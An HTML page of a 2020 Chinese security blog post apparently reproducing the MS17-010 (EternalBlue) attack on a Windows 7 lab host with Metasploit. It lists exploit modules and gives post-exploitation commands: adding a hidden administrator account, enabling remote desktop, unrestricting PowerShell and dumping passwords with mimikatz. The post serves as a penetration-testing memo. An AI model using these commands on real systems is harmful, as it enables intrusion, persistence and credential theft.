@@ -1,0 +1,243 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>MS17-010利用总结 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1212/logo.jpg')">
+            </div>
+          
+          <h2 class="post-title">MS17-010利用总结</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-04-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/ms17-010/">
+                    ms17-010
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/yong-heng-zhi-lan/">
+                    永恒之蓝
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  最近做安全服务，发现很多客户那边任然存在“永恒之蓝”漏洞的主机。这里简单复现一下，方便演示。<s><em>主要是自己忘了msf的基本命令了,复习一下。</em></s></p>
+<!-- more -->
+<h3 id="0x01-漏洞环境">0x01 漏洞环境</h3>
+<p>这里直接用Win7的SP1，不需要关闭防火墙，在不打补丁的情况下直接打开文件共享服务即可利用该漏洞。<br>
+<img src="https://tuchuang.looklook.workers.dev/1212/win7.png" alt="sp1" loading="lazy"><br>
+<img src="https://tuchuang.looklook.workers.dev/1212/445.png" alt="smb" loading="lazy"></p>
+<h3 id="0x02-模块介绍">0x02 模块介绍</h3>
+<p>接下来就是msf的常规的利用了。首先搜索可利用的模块,这里我最常用的是1、2、4条。</p>
+<blockquote>
+<p>auxiliary/admin/smb/ms17_010_command 直接执行命令，需要漏洞主机的用户名和密码参数<br>
+auxiliary/scanner/smb/smb_ms17_010     扫描是否存在该漏洞<br>
+exploit/windows/smb/ms17_010_eternalblue   直接利用回弹shell，建议设置Payload<br>
+exploit/windows/smb/ms17_010_eternalblue_win8   同上<br>
+exploit/windows/smb/ms17_010_psexec 直接利用获得meterpreter会话，需要提供用户名和密码参数</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/1212/ms17.png" alt="ms17" loading="lazy"></figure>
+<h3 id="0x03-漏洞扫描">0x03 漏洞扫描</h3>
+<p>首先利用扫描模块可以快速判断是否存在该漏洞<br>
+<img src="https://tuchuang.looklook.workers.dev/1212/scan.png" alt="scan" loading="lazy"></p>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<p>接着直接利用exploit模块即可，模块默认回弹shell不好操作建议设置payload。<br>
+<img src="https://tuchuang.looklook.workers.dev/1212/exploit.png" alt="exploit" loading="lazy"></p>
+<h3 id="0x05-后渗透">0x05 后渗透</h3>
+<p>漏洞利用成功后，后渗透才是关键，怎么在内网漫游都在这里体现，随时更新 备忘.....</p>
+<h4 id="1检查是否是虚拟机">1.检查是否是虚拟机</h4>
+<blockquote>
+<p>meterpreter &gt; run post/windows/gather/checkvm</p>
+</blockquote>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/1212/checkvm.png" alt="checkvm" loading="lazy"></figure>
+<h4 id="2查看主机闲置时间">2.查看主机闲置时间</h4>
+<blockquote>
+<p>meterpreter &gt; idletime</p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://tuchuang.looklook.workers.dev/1212/time.png" alt="time" loading="lazy"></figure>
+<h4 id="3文件上传">3.文件上传</h4>
+<blockquote>
+<p>upload + [目标文件位置] -&gt; [存放文件位置]<br>
+meterpreter &gt; upload /root/1.txt -&gt; c:/</p>
+</blockquote>
+<figure data-type="image" tabindex="4"><img src="https://tuchuang.looklook.workers.dev/1212/upload.png" alt="upload" loading="lazy"></figure>
+<h4 id="4文件下载">4.文件下载</h4>
+<blockquote>
+<p>download + [目标文件位置] -&gt; [存放文件位置]<br>
+meterpreter &gt; download c:/1.txt -&gt; /root/</p>
+</blockquote>
+<figure data-type="image" tabindex="5"><img src="https://tuchuang.looklook.workers.dev/1212/download.png" alt="download" loading="lazy"></figure>
+<h4 id="5打开powershell并修改执行策略">5.打开Powershell并修改执行策略</h4>
+<blockquote>
+<p>meterpreter &gt; load powershell<br>
+meterpreter &gt; powershell_shell<br>
+PS &gt; Set-ExecutionPolicy Unrestricted<br>
+PS &gt; Get-ExecutionPolicy</p>
+</blockquote>
+<figure data-type="image" tabindex="6"><img src="https://tuchuang.looklook.workers.dev/1212/powershell.png" alt="powershell" loading="lazy"></figure>
+<h4 id="6添加用户并加入管理员组">6.添加用户并加入管理员组</h4>
+<blockquote>
+<p>meterpreter &gt; shell<br>
+C:\Windows\system32&gt;chcp 65001<br>
+C:\Windows\system32&gt;net user hack hack /add<br>
+C:\Windows\system32&gt;net localgroup administrators hack /add<br>
+C:\Windows\system32&gt;net user</p>
+</blockquote>
+<figure data-type="image" tabindex="7"><img src="https://tuchuang.looklook.workers.dev/1212/users.png" alt="add_user" loading="lazy"></figure>
+<h4 id="7打开远程桌面">7.打开远程桌面</h4>
+<blockquote>
+<p>meterpreter &gt; run post/windows/manage/enable_rdp<br>
+root@kali:~# rdesktop -u hack  -p hack 192.168.200.124</p>
+</blockquote>
+<figure data-type="image" tabindex="8"><img src="https://tuchuang.looklook.workers.dev/1212/rdp.png" alt="rdp" loading="lazy"></figure>
+<h4 id="8盗取密码凭证">8.盗取密码凭证</h4>
+<blockquote>
+<p>meterpreter &gt; load mimikatz<br>
+meterpreter &gt; wdigest</p>
+</blockquote>
+<figure data-type="image" tabindex="9"><img src="https://tuchuang.looklook.workers.dev/1212/steal_pass.png" alt="steal_pass" loading="lazy"></figure>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/ms17-010.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/winrar.html/">
+              <h3 class="post-title">
+                下一篇：WinRAR远程代码执行漏洞
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
